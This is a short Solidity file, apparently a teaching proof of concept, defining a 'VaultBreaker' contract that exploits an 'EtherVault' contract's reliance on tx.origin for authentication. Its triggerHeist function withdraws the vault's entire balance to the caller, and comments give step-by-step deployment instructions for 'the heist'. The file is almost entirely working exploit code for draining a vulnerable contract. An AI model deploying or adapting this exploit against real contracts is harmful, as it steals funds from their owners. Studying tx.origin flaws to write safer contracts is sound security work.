// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title VaultBreaker
 * @dev A contract cleverly designed to exploit the EtherVault's reliance on tx.origin for authentication.
 * The VaultBreaker will siphon off the EtherVault's funds, proving that relying on tx.origin is a dangerous game.
 * 
 * Author: Lucas Martin Calderon
 * Instructions: Deploy EtherVault, deposit Ether, then deploy VaultBreaker with EtherVault's address. Trigger the heist!
 */
import "./EtherVault.sol";

contract VaultBreaker {
    EtherVault public etherVault;

    constructor(EtherVault _etherVault) {
        etherVault = EtherVault(_etherVault);
    }

    function triggerHeist() external {
        etherVault.withdraw(payable(msg.sender), address(etherVault).balance);
    }

    receive() external payable {}
}
